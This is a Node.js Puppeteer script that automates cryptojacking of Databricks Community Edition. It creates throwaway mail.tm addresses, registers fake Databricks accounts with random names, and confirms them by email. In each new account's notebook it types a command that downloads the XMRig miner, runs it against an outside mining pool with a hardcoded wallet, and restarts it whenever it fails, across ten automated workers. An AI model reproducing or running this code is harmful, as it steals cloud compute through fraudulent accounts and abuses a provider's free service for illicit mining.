const puppeteer = require('puppeteer');
const _ = require('lodash');
const userA = require('./user-agents-gs.json');
const cheerio = require('cheerio');
const interval = require('interval-promise')

function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
      charactersLength));
  }
  return result;
}

const setup = async () => {
  let browser;

  let page;
  let page2;
  try {
    const minimal_args = [
      '--autoplay-policy=user-gesture-required',
      '--disable-background-networking',
      '--disable-background-timer-throttling',
      '--disable-backgrounding-occluded-windows',
      '--disable-breakpad',
      '--disable-client-side-phishing-detection',
      '--disable-component-update',
      '--disable-default-apps',
      '--disable-dev-shm-usage',
      '--disable-domain-reliability',
      '--disable-features=AudioServiceOutOfProcess',
      '--disable-hang-monitor',
      '--disable-ipc-flooding-protection',
      '--disable-notifications',
      '--disable-offer-store-unmasked-wallet-cards',
      '--disable-popup-blocking',
      '--disable-print-preview',
      '--disable-prompt-on-repost',
      '--disable-renderer-backgrounding',
      '--disable-setuid-sandbox',
      '--disable-speech-api',
      '--disable-sync',
      '--hide-scrollbars',
      '--ignore-gpu-blacklist',
      '--metrics-recording-only',
      '--mute-audio',
      '--no-default-browser-check',
      '--no-first-run',
      '--no-pings',
      '--no-sandbox',
      '--no-zygote',
      '--password-store=basic',
      '--use-gl=swiftshader',
      '--use-mock-keychain'
    ];
    browser = await puppeteer.launch({
      headless: false,
      args: minimal_args,
      timeout: 1000000000,
    });
    console.log('Start setup');
    page = await browser.newPage();
    await page.setUserAgent(_.sample(userA).userAgent);
    await page.goto("https://mail.tm/en/", { timeout: 10000000 });
    await page.waitFor(6000);
    await (await page.$x('//*[@id="address"]'))[0].click();
    const context = await browser.defaultBrowserContext();
    await context.overridePermissions('https://mail.tm/en/', ['clipboard-read'])
    const emailAddress = await page.evaluate(`(async () => await navigator.clipboard.readText())()`);
    console.log('emailAddress', emailAddress);
    page2 = await browser.newPage();
    page.setDefaultNavigationTimeout(6000000);
    await page2.goto('https://databricks.com/try-databricks', { timeout: 10000000 });
    await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 4)));
    await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 3)));
    await (await page2.$x('//*[@id="FirstName"]'))[0].type(makeid(_.range(1, 2)));
    await new Promise((rs) => setTimeout(rs, 1000));
    await (await page2.$x('//*[@id="LastName"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="LastName"]'))[0].type(makeid(_.range(1, 4)));
    await (await page2.$x('//*[@id="LastName"]'))[0].type(makeid(_.range(1, 5)));
    await (await page2.$x('//*[@id="LastName"]'))[0].type(makeid(_.range(1, 3)));
    await (await page2.$x('//*[@id="LastName"]'))[0].type(makeid(_.range(1, 2)));
    await new Promise((rs) => setTimeout(rs, 1000));
    await (await page2.$x('//*[@id="Company"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="Company"]'))[0].type(makeid(_.range(1, 4)));
    await (await page2.$x('//*[@id="Company"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="Company"]'))[0].type(makeid(_.range(1, 5)));
    await (await page2.$x('//*[@id="Company"]'))[0].type(makeid(_.range(1, 2)));
    await new Promise((rs) => setTimeout(rs, 1000));
    await (await page2.$x('//*[@id="Email"]'))[0].type(emailAddress);
    await new Promise((rs) => setTimeout(rs, 1000));
    await (await page2.$x('//*[@id="Title"]'))[0].type(makeid(_.range(1, 3)));
    await (await page2.$x('//*[@id="Title"]'))[0].type(makeid(_.range(1, 2)));
    await (await page2.$x('//*[@id="Title"]'))[0].type(makeid(_.range(1, 4)));
    await (await page2.$x('//*[@id="Title"]'))[0].type(makeid(_.range(1, 5)));
    await (await page2.$x('//*[@id="Title"]'))[0].type(makeid(_.range(1, 2)));
    await new Promise((rs) => setTimeout(rs, 1000));
    await (await page2.$('#mkto_form_consent')).press('Space');
    await new Promise((rs) => setTimeout(rs, 3000));
    await page2.click('.mktoButton');
    console.log('Register');
    await new Promise((rs) => setTimeout(rs, 10000));
    await (await page2.$x('//*[@id="ce-placeholder-button"]'))[0].press('Enter');
    await new Promise((rs) => setTimeout(rs, 20000));
    await page2.goto("https://mail.tm/en/");
    await new Promise((rs) => setTimeout(rs, 10000));
    console.log('Check mail');
    await (await page2.$x('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul/li/a/div'))[0].click();
    await new Promise((rs) => setTimeout(rs, 10000));
    const html = await page2.evaluate(
      () => document.querySelector('iframe').getAttribute('srcdoc')
    )
    const $ = cheerio.load(html);
    await page2.goto($('a[href*="https://community.cloud.databricks.com/login.html"]').attr('href'));
    await new Promise((rs) => setTimeout(rs, 10000));
    await (await page2.$x('//*[@id="reset-container"]/div/div[1]/input'))[0].type('1234Asdfg@');
    await (await page2.$x('//*[@id="reset-container"]/div/div[2]/input'))[0].type('1234Asdfg@');
    await new Promise((rs) => setTimeout(rs, 2000));
    await (await page2.$x('//*[@id="reset-container"]/div/div[3]/button'))[0].click();
    await new Promise((rs) => setTimeout(rs, 15000));
    await (await page2.$x('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]'))[0].click();
    await new Promise((rs) => setTimeout(rs, 2000));
    await (await page2.$x('//*[@id="input"]'))[0].type('prog');
    await (await page2.$x('/html/body/div[4]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]'))[0].click();
    await new Promise((rs) => setTimeout(rs, 15000));
    await page2.click('.CodeMirror-line');
    console.log('Send cmd');
    await page2.type('.CodeMirror textarea', "! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TQmRkvGr65k473NrHNe9jaZiJ4dx337rj9.WORKER_" + makeid(5) + '_' + new Date().getTime());
    await page2.click('.fa-play');
    await page2.click('.run-cell > .fa');
    await (await page2.$x('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]'))[0].click();
    console.log('Done - Start interval');
    interval(async () => {
      if (await page2.$('.error-summary')) {
        await page2.click('.fa-play');
        await page2.click('.run-cell > .fa');
        await (await page2.$x('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]'))[0].click();
      }
    }, 300000);
  } catch (e) {
    const pages = await browser.pages();
    await Promise.all(pages.map(page => page.close()));
    await browser.close();
    throw e;
  }
}

const loopSetup = async (i = 0) => {
  try {
    await setup();
  } catch (e) {
    console.error(e)
    ++i;
    console.log('i', i);
    if (i <= 100) {
      console.log('Retry setup', i);
      await new Promise((rs) => setTimeout(rs, 30000));
      await loopSetup(i);
    } else {
      throw e;
    }
  }
}

(async () => {
  let num = 0;
  let startWorkers = 10;
  const generate = async (workers) => {
    for (let i = 1; i <= workers; i++) {
      console.log('Worker ', i)
      try {
        await loopSetup();
      } catch (e) {
        console.log('Ignore error', e);
      }
      ++num;
    }

    console.log('Done - create workers', num);
    if (num < startWorkers) {
      await generate(workers - num);
    }
  }
  await generate(startWorkers);
})();
